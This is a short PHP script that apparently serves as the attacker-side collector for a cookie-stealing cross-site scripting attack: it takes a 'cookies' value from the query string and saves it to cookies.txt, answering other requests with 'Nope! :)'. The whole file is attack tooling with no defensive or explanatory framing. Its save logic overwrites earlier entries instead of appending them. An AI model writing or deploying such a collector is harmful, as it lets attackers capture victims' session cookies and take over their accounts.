<?php

if(isset($_GET['cookies'])){
	$saveFile = file_get_contents('cookies.txt');
	$saveFile = $_GET['cookies']."\n";
	file_put_contents('cookies.txt', $saveFile);
}else{
	echo "Nope! :)";
}
?>